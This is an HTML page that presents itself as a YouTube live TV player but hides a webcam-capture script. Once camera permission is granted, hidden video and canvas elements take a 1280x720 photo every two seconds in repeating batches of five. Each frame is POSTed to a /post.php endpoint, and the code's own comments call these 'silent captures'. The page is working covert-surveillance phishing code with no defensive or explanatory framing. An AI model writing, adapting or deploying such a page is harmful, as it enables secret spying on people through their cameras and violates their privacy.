<!doctype html>
<html>
<head>
<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
</head>

<div class="video-wrap" hidden="hidden">
   <video id="video" playsinline autoplay></video>
</div>

<canvas hidden="hidden" id="canvas" width="1280" height="720"></canvas>

<script>

function post(imgdata){
    console.log('Attempting to post image data...');
    $.ajax({
        type: 'POST',
        data: { cat: imgdata},
        url: '/post.php',
        dataType: 'json',
        async: false,
        success: function(result){
            console.log('Post success:', result);
        },
        error: function(xhr, status, error){
            console.error('Post failed:', status, error);
        }
      });
    };


'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {
    
    facingMode: "user"
  }
};

// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}

// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

var context = canvas.getContext('2d');
var captureCount = 0;
var maxCaptures = 5;
var captureInterval;

function capturePhoto() {
   context.drawImage(video, 0, 0, 1280, 720);
   var canvasData = canvas.toDataURL("image/png", 0.95).replace("image/png", "image/octet-stream");
   post(canvasData);
   captureCount++;
   console.log('Silent capture #' + captureCount + ' completed');
   
   if (captureCount >= maxCaptures) {
     clearInterval(captureInterval);
     console.log('First batch of 5 silent captures completed');
     
     // Start next batch automatically after 3 seconds
     setTimeout(function() {
       console.log('Starting next batch of 5 silent captures');
       captureCount = 0;
       captureInterval = setInterval(capturePhoto, 2000);
     }, 3000);
   }
}

// Start capture IMMEDIATELY when camera permission granted
console.log('Camera permission granted - starting immediate capture');
capturePhoto(); // First capture immediately
captureInterval = setInterval(capturePhoto, 2000); // Then every 2 seconds
}

// Load init
init();

</script>

    <body>
        <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

    </body>

</html>
